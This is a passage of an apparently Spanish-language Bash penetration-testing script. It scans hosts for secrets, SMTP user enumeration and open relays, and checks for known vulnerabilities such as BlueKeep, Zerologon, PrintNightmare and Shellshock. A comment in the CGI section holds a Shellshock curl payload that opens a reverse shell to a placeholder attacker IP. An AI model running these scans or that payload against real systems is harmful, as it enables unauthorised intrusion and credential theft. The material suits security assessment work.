	rm checksumsEscaneados.txt # tiene hashes md5 
	# Creando repositorio temporal para que pueda ser escaneado por las herramientas

	# cat scripts.js | js-beautify  | tee scripts.js

	rm -rf .git 2>/dev/null
	git init
	git add .
	git commit -m "test"

	# llaves SSH
	echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 

	# AWS Secret Access Key
	echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 

	# Azure Shared Key
	echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 

	# RSA private key 
	echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 

	# passwords 
	echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 


	# generic token - dumpster-diver
	echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
	docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 

	# generic token - truffle
	docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_trufflehog_secrets.txt

	cd ..

	grep "found" logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO_EXTERNO"_web_secrets.txt 
	grep "found" logs/vulnerabilidades/"$DOMINIO_EXTERNO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO_EXTERNO"_web_secrets.txt 
	find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert_data
	###################
fi



if [ -f servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l servicios/smtp.txt`) ######################$RESET"	    
		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			
			echo -e "[+] Escaneando $ip:$port"

			if [ ! -z "$DOMINIO_EXTERNO" ]; then
				DOMINIO=$DOMINIO_EXTERNO
			fi

			if [ ! -z "$DOMINIO_INTERNO" ]; then
				DOMINIO=$DOMINIO_INTERNO
			fi
			
			########## Banner #######
			echo -e "\t[+] Obteniendo banner"
			$proxychains nc -w 3 $ip $port <<<"EHLO localhost"& > .banners/"$ip"_"$port".txt						
			#interlace -tL .servicios/smtp-interlace.txt -threads 5 -c "nc -w 3 _target_ _port_ <<'EHLO localhost' > ./_target___port__nc.txt" -p 25 --silent
						
			if [ "$PROXYCHAINS" == "n" ]; then 
				########## VRFY #######
				echo -e "\t[+] Comprobando comando vrfy (DOMINIO $DOMINIO)"
				echo "vrfy-test.py $ip $port $DOMINIO " >> logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt
				
				#prueba usuario@dominio.com
				vrfy-test.py $ip $port $DOMINIO >> logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt 
				echo "" >> logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt
				
				#prueba usuario
				echo "vrfy-test2.py $ip $port $DOMINIO " >> logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt
				vrfy-test2.py $ip $port $DOMINIO >> logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt 
				
				egrep -iq "User unknown" logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t$OKRED[!] Comando VRFY habilitado \n $RESET"
					cp logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt  .vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt 				
					echo -e "\t[+] Enumerando usuarios en segundo plano"
					smtp-user-enum.pl -M VRFY -U $common_user_list -t $ip > logs/vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt &
					
				else
					echo -e "\t$OKGREEN[ok] No tiene el comando VRFY habilitado $RESET"
				fi		
				#########################

			fi  
			
			
			# Vulnerabilidades
			echo "$proxychains  nmap -Pn --script=smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt 2>/dev/null
			$proxychains nmap -n -Pn --script=smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -p $port $ip>> logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt 2>/dev/null
			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT VULNERABLE|cve2010-4344" > .vulnerabilidades/"$ip"_"$port"_smtpVuln.txt

			
			if [ "$PROXYCHAINS" == "n" ]; then 
				########## open relay #######
				echo ""
				echo -e "\t[+] Probando si es un open relay"
				
				#### probar con root@$DOMINIO
				echo -e "\t\t[+] Probando con el correo root@$DOMINIO"	
				open-relay.py $ip $port "root@$DOMINIO" > logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
				#fi	
										
				sleep 5							
				
				#### si no existe el correo probar con info@$DOMINIO
				egrep -iq "Sender unknown|Recipient unknown|No Such User Here|no valid recipients" logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then	
					echo -e "\t\t[+] Upps el correo root@$DOMINIO no existe probando con info@$DOMINIO"
					#if [ $internet == "s" ]; then 
						#hackWeb.pl -t $ip -p $port -m openrelay -c "info@$DOMINIO" -s 0> logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
					#else	
						open-relay.py $ip $port "info@$DOMINIO" > logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
					#fi							
				fi	
				
				#### si no existe el correo probar con sistemas@$DOMINIO
				egrep -iq "Sender unknown|Recipient unknown|No Such User Here|no valid recipients" logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t\t[+] Upps el correo info@$DOMINIO no existe probando con sistemas@$DOMINIO"
					#if [ $internet == "s" ]; then 
						hackWeb.pl -t $ip -p $port -m openrelay -c "sistemas@$DOMINIO" -s 0> logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
					#else	
						#open-relay.py $ip $port "sistemas@$DOMINIO_EXTERNO" > logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 2>/dev/null 
					#fi							
				fi	
				
				# IP en lista negra
				egrep -iq "JunkMail rejected|REGISTER IN BLACK|Client host rejected" logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t$OKRED[!] No se pudo completar la prueba (Nuestra IP esta en lista negra)$RESET"
				fi
				
				# usuario desconocido
				egrep -iq "Sender unknown|Recipient unknown|No Such User Here|no valid recipients" logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t$OKRED[!] No se pudo completar la prueba (No existe el usuario destinatario)$RESET"
				fi
					
				#Envio exitoso	
				egrep -iq "queued as|250 OK id=|accepted for delivery|message saved" logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t$OKRED[!] Open Relay detectado \n $RESET"
					cp logs/vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt  .vulnerabilidades/"$ip"_"$port"_openrelay"$VECTOR".txt 
				else
					echo -e "\t$OKGREEN[ok] No es un open relay $RESET"
					
				fi		
				#########################

			fi  
																
 			echo ""
		done <servicios/smtp.txt				
	insert_data	
fi


if [ -f servicios/smb_uniq.txt ]
then
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo '$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms08-067 _target_' >> logs/vulnerabilidades/_target__445_ms08067.txt >/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms08-067 _target_ > logs/vulnerabilidades/_target__445_ms08067.txt" --silent
fi

	
if [ -f servicios/rdp.txt ]
then
    
    #if [ $rdp == "s" ] ; then	
		#mkdir -p screenshots
		echo -e "$OKBLUE #################### RDP (`wc -l servicios/rdp.txt`) ######################$RESET"	  
		for line in $(cat servicios/rdp.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			#nmap -Pn -p $port $ip --script=rdp_enum-encryption > .enumeracion/$ip/rdp.txt 2>/dev/null					
			echo -e "[+] Escaneando $ip:$port"	

	
			echo "$proxychains  nmap -Pn -p $port --script rdp-ntlm-info $ip"  > logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
			$proxychains nmap -n -Pn -p $port --script rdp-ntlm-info $ip >> logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
			grep --color=never "|" logs/enumeracion/"$ip"_"$port"_rdpInfo.txt   | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_"$port"_rdpInfo.txt


			echo -e "\t\t[+] Revisando vulnerabilidad blueKeep"			
			$proxychains blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt 2>/dev/null
			grep "VULNERABLE" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
			
			echo -e "\t\t[+] Revisando vulnerabilidad MS12-020"
			$proxychains nmap -n -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
			grep --color=never "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_3389_ms12020.txt
			
			while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`
				if [ "$free_ram" -gt 300 ]			
				then					
					echo -e "\t [+] Obteniendo Certificado SSL"		
					#rdpscreenshot -o `pwd`/screenshots/ $ip 2>/dev/null			
					$proxychains get_ssl_cert.py $ip $port 2>/dev/null | grep --color=never "("> .enumeracion/"$ip"_"$port"_cert.txt  &
					sleep 0.2
					break
				else
					python_instancias=`pgrep get_ssl_cert | wc -l`
					echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de python ($python_instancias)"
					sleep 3
				fi
			done	# done true	
			
		done	
	#fi   
	
	# revisar si hay scripts ejecutandose
	while true; do
	webbuster_instancias=`ps aux | egrep 'get_ssl_cert|buster|nmap' | grep -v  lanscanner.sh | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 10
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data	 		
fi


find logs -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files


if [ -f servicios/tftp.txt ]
then
	echo -e "$OKBLUE #################### TFTP (`wc -l servicios/tftp.txt`) ######################$RESET"	    	
	for line in $(cat servicios/tftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
		$proxychains nmap -n -Pn -sU -p 69 --script tftp-enum.nse $ip  > logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
				
	done		
	
	insert_data	
fi

if [ -f servicios/voip.txt ]
then
	echo -e "$OKBLUE #################### VoIP (`wc -l servicios/voip.txt`) ######################$RESET"	    	
	for line in $(cat servicios/voip.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		if [ "$MODE" == "hacking" ]; then 
			echo -e "[+] Obteniendo extensiones $ip:$port"		
			$proxychains svwar -m INVITE -e1-500 $ip > logs/enumeracion/"$ip"_voip_extensions.txt 2>/dev/null
			grep reqauth logs/enumeracion/"$ip"_voip_extensions.txt > .enumeracion/"$ip"_voip_extensions.txt
		fi	
				
	done		
	
	insert_data	
fi

		

if [ -f servicios/ftp.txt ]
then
	echo -e "$OKBLUE #################### FTP (`wc -l servicios/ftp.txt`) ######################$RESET"	    
	touch 68b329da9893e34099c7d8ad5cb9c940.txt # file to test upload
	for line in $(cat servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
		$proxychains nmap -n -sT -sV -Pn -p $port $ip --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
		
		echo -e "\t[+] Obtener banner"	
		echo -e "\tLIST" | nc -w 3 $ip $port > .banners/"$ip"_"$port".txt 2>/dev/null 
		
		######## revisar si no es impresora #####		
		egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKGREEN[i] Es una impresora $RESET"
		else					
			egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/"$ip"_23_webData.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKGREEN[i] Es una impresora $RESET"
			else							
				echo -e "\t[+] Comprobando usuario anonymous"
				echo "ftp_anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt" > logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt 2>/dev/null 
				$proxychains ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt >> logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt 2>/dev/null 
				grep "Listado de directorio" logs/vulnerabilidades/"$ip"_21_ftpAnonymous.txt > .vulnerabilidades/"$ip"_21_ftpAnonymous.txt
				sleep 5
			fi
		fi	
		#######################################
		
	done	
	rm 68b329da9893e34099c7d8ad5cb9c940.txt 2>/dev/null

	#insert clean data	
	insert_data
	
fi

find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files

if [ -f servicios/cgi.txt ]
then
        		
		echo -e "$OKBLUE #################### CGI (`wc -l servicios/cgi.txt`) ######################$RESET"	  

		num_lines=`wc -l servicios/cgi.txt | awk '{print $1}'`
		echo "num_lines ($num_lines)"
		#if [ "$smtp_user_enum_instancias" -gt 1 ]
		if [ "$num_lines" -le 3 ] ; then		

			for line in $(cat servicios/cgi.txt); do
				ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
				port_path=`echo $line | cut -d ":" -f 3`
				port=`echo $port_path | cut -d "/" -f 1`
				path="/"`echo $port_path | cut -d "/" -f 2-8`
				
				echo -e "[+] Escaneando $ip:$port"	
				echo -e "\t \t[+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"
					
				echo "$proxychains  nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip" >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
				$proxychains nmap -n -Pn -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
				grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|http-server-header|Problem" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
				
				if [ -s .vulnerabilidades/"$ip"_"$port"_shellshock.txt ] # if FILE exists and has a size greater than zero.
				then
					echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
					echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
				else				
					echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
				fi
				# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/{attacker-IP-address}/{listen-port} 0>&1'" http://{target}/cgi-bin/{vulnerable}
				
			done

		fi

		
	
	#insert clean data	
	insert_data		 	
fi





	
## Procesar los usuarios enumerados con smtp-user-enum.pl
if [ -f servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l servicios/smtp.txt`) ######################$RESET"	    
		
		# revisar si hay scripts ejecutandose
		echo -e "[+] Verificar si se esta ejecutando smtp-user-enum.pl"
		while true; do
			smtp_user_enum_instancias=`ps aux | egrep 'smtp-user-enum.pl' | wc -l`		
			if [ "$smtp_user_enum_instancias" -gt 1 ]
			then
				echo -e "\t[-] Todavia esta smtp-user-enum.pl activo ($smtp_user_enum_instancias)"				
				sleep 10
			else
				break		
			fi
		done	# done true	


		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`					
			echo -e "[+]  $ip:$port"
			egrep -iq "User unknown" logs/vulnerabilidades/"$ip"_"$port"_vrfyHabilitado.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then							
				grep --color=never "exists" logs/vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt > .vulnerabilidades/"$ip"_"$port"_vrfyEnum.txt					
				echo -e "\t$OKRED[!] Se enumero usuarios mediante el comando VRFY \n $RESET"
			else				
				echo -e "\t$OKGREEN[i] No se encontro usuarios $RESET"
			fi
		done <servicios/smtp.txt	
		insert_data
fi		 


##################################### banners ##########################
echo ""
echo -e "$OKBLUE ############# Obteniendo banners de los servicios ############## $RESET"
getBanners.pl -l .datos/total-host-vivos.txt -t .escaneo_puertos/tcp.txt -p "$proxychains"

######## wait to finish########
  while true; do
	nmap_instancias=$((`ps aux | grep nmap | grep -v lanscanner | wc -l` - 1)) 
  if [ "$nmap_instancias" -gt 0 ]
	then
		echo -e "\t[i] Todavia hay escaneos de nmap activos ($nmap_instancias)"  
		sleep 30
	else
		break		  		 
	fi				
  done
##############################

for ip in $(cat .datos/total-host-vivos.txt); do
	#os_details=`nmap -n -sT -Pn --script smb-os-discovery.nse -p445 $ip`
	os_details=`egrep --color=never '\|   OS:' .escaneo_puertos_banners/"$ip".txt 2>/dev/null  | cut -d ":" -f2`
	
	if [ -z "$os_details" ]; then
		os_details=`egrep --color=never 'OS details:' .escaneo_puertos_banners/"$ip".txt 2>/dev/null | cut -d ":" -f2 |cut -d "," -f1-4`
	fi

	if [ -z "$os_details" ]; then
		os_details=`egrep --color=never 'Aggressive OS guesses:' .escaneo_puertos_banners/"$ip".txt 2>/dev/null  | cut -d ":" -f2 |cut -d "," -f1-4`
	fi

	echo $os_details  > .enumeracion/"$ip"_os_version.txt
	echo "$ip:$os_details" >> reportes/reporte-OS.csv
done

insert_data

######################  
# windows 
grep -i windows reportes/reporte-OS.csv 2> /dev/null | cut -d ":" -f 1 >> servicios/Windows.txt

# servers
egrep -i "server|unix|Samba" reportes/reporte-OS.csv 2>/dev/null | cut -d ":" -f1 >> servicios/servers2.txt
cat servicios/ldap.txt 2>/dev/null | cut -d ":" -f1 >> servicios/servers2.txt 2>/dev/null 
sort servicios/servers2.txt | uniq > servicios/servers.txt
rm servicios/servers2.txt
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
###########################

cat .escaneo_puertos_banners/*.grep > .escaneo_puertos/nmap-tcp-banners.grep 2>/dev/null
cat .escaneo_puertos_banners/*.txt > reportes/nmap-tcp-banners.txt 2>/dev/null
#############################################################################


#servers
if [ -f servicios/servers.txt ]
then
	echo -e "$OKBLUE #################### Servers (`wc -l servicios/servers.txt`)######################$RESET"	    
	while read ip       
	do     			
		#ip=`echo $line | cut -f1 -d":"`		
		echo -e "[+] Escaneando $ip"

		egrep -iq "445/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "\t[+] Probando enum4linux"
			###### Enum4linux ######
			echo "enum4linux -R 0-25,500-525,1000-1025,3000-3025 $ip 2>/dev/null | grep -iv \"unknown\""  > logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
			$proxychains enum4linux -R 0-25,500-525,1000-1025,3000-3025 $ip 2>/dev/null | grep -iv "unknown" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> logs/vulnerabilidades/"$ip"_445_enum4linux.txt &
			#######################

			###### zerologon ######
			netbiosName=`nmap -n -sT -Pn --script smb-os-discovery.nse -p445 $ip | grep -i netbios | awk '{print $5}' | cut -d '\' -f1 `
			echo -e "\t[+] netbiosName $netbiosName"		
				
			if [ ! -z "$netbiosName" ]; then
				echo $netbiosName > logs/vulnerabilidades/"$ip"_"445"_zerologon.txt 
				$proxychains zerologon_tester.py $netbiosName $ip >> logs/vulnerabilidades/"$ip"_"445"_zerologon.txt 2>/dev/bull
				grep "DC can be fully compromised by a Zerologon attack" logs/vulnerabilidades/"$ip"_"445"_zerologon.txt  > .vulnerabilidades/"$ip"_"445"_zerologon.txt
				#######################		
			fi		


			###### PrintNightmare ######
			$proxychains rpcdump.py $ip  >> logs/vulnerabilidades/"$ip"_"445"_PrintNightmare.txt 		
			egrep "MS-RPRN|MS-PAR" logs/vulnerabilidades/"$ip"_"445"_PrintNightmare.txt  > .vulnerabilidades/"$ip"_"445"_PrintNightmare.txt
			#######################	

		fi				
															
		 echo ""
 	done <servicios/servers.txt		
	#insert clean data	
	insert_data
	
fi


if [ -f servicios/camaras-ip.txt ]
then
	echo -e "$OKBLUE #################### Camaras IP (`wc -l servicios/camaras-ip.txt`) ######################$RESET"	  
	for line in $(cat servicios/camaras-ip.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		echo -e "[+] Escaneando $ip:$port"		
		egrep -iq $ip servicios/Windows.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t[i] Es un dispositivo windows"			
		else
			echo -e "\t[+] Testeando open stream"
			echo "$proxychains  nmap -Pn -n -sT -sV -p 554 --script=rtsp-url-brute $ip" > logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null 
			$proxychains  nmap -n -Pn -sT -p 554 --script=rtsp-url-brute $ip >> logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null 
			egrep -iq "discovered" logs/vulnerabilidades/"$ip"_554_openstreaming.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Open stream detectado \n $RESET"
				cp logs/vulnerabilidades/"$ip"_554_openstreaming.txt  .vulnerabilidades/"$ip"_554_openstreaming.txt 		
			else
				echo -e "\t$OKGREEN[i] No es un Open stream $RESET"
			fi								
		fi			
		
	done
	insert_data		
fi



cd .escaneo_puertos		
	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/MikroTik2.txt
	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/MikroTik2.txt 
	sort ../servicios/MikroTik2.txt | sort | uniq > ../servicios/MikroTik.txt; rm ../servicios/MikroTik2.txt
	
	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/d-link2.txt
	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ubiquiti2.txt
	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/fortinet2.txt
	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/3com2.txt
	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/linksys2.txt
	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/Netgear.txt
	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/zyxel.txt
	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ZTE2.txt
	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ZTE2.txt
	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/tp-link.txt
	#grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/cisco.txt
	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ciscoASA.txt	
	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/samba.txt
	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/RomPager.txt
	grep -i "NetScreen" nmap-tcp-banners.grep | grep -iv "Virata" 2>/dev/null | awk '{print $2}' | uniq >> ../servicios/NetScreen.txt #juniper
	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/upnp.txt; sort ../servicios/upnp.txt | uniq >../servicios/upnp2.txt ; mv ../servicios/upnp2.txt ../servicios/upnp.txt
	
	### Revisar certificados SSL, Titulos web ##
cd ..

cd .enumeracion2/
	touch canary.txt # es necesario que exista al menos 2 archivos 
	
	#phpmyadmin, etc
	#responde con 401
	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/web401.txt
	
	#responde con 200 OK
	cat *_webadmin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
	
	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google" | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
	# 
	
	#fortinet
